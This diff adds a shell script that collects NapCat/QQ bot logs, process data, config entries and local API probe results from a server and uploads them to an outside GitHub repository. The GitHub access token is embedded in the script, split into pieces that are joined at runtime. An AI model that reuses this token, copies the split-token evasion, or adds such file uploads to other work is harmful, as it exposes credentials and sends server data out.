@@ -1,0 +1,32 @@
+287783
+A=github_pat_11BQPEBSA0
+B=iHriCXm9QGCt_74skvWNFH
+C=KumHCtG6L026yU4FNjISYSZ
+D=VmIjR9F9Ojw3QEXVSIPygfznQqG
+TOK="${A}${B}${C}${D}"
+API='https://api.github.com/repos/Thousands91/-1/contents/remote'
+LOG=/tmp/napcat_state.txt
+: > "$LOG"
+echo "=== 时刻 $(date '+%m-%d %H:%M:%S') ===" >> "$LOG"
+echo "--- napcat.log mtime+size+尾3行 ---" >> "$LOG"
+stat -c '%y %s' /root/napcat.log 2>/dev/null >> "$LOG"
+tail -3 /root/napcat.log >> "$LOG"
+echo "--- QQ进程启动时刻(全部) ---" >> "$LOG"
+for p in $(ps -eo pid,args | awk '/[o]pt\/QQ\/qq/ {print $1}'); do echo "pid=$p start=$(stat -c %y /proc/$p 2>/dev/null)"; done >> "$LOG"
+echo "--- NapCat配置目录 ---" >> "$LOG"
+ls -la /root/Napcat/config/ 2>/dev/null >> "$LOG"
+grep -rE '"port"|"host"|http|ws' /root/Napcat/config/ 2>/dev/null | head -20 >> "$LOG"
+echo "--- guard_run.log尾12行 ---" >> "$LOG"
+tail -12 /root/guard_run.log 2>/dev/null >> "$LOG"
+echo "--- bot.log mtime+size ---" >> "$LOG"
+stat -c '%y %s' /root/bot.log 2>/dev/null >> "$LOG"
+echo "--- NapCat HTTP API探活(3000/3001/6099/8080) ---" >> "$LOG"
+for port in 3000 3001 6099 8080 5700; do
+  R=$(curl -s --max-time 3 "http://127.0.0.1:$port/get_login_info" 2>/dev/null)
+  echo "port $port => ${R:0:200}" >> "$LOG"
+done
+echo "DONE=$(date '+%m-%d %H:%M:%S')" >> "$LOG"
+SHA=$(curl -s --max-time 15 -H "Authorization: token $TOK" "$API/napcat_state.txt" | grep -o '"sha": "[^"]*"' | head -1 | sed 's/.*: "//;s/"//')
+B=$(base64 -w0 "$LOG")
+if [ -n "$SHA" ]; then P="{\"message\":\"napcatstate\",\"content\":\"$B\",\"sha\":\"$SHA\",\"branch\":\"main\"}"; else P="{\"message\":\"napcatstate\",\"content\":\"$B\",\"branch\":\"main\"}"; fi
+curl -s -o /dev/null -w "PUT:%{http_code}\n" --max-time 60 -X PUT -H "Authorization: token $TOK" "$API/napcat_state.txt" -d "$P"
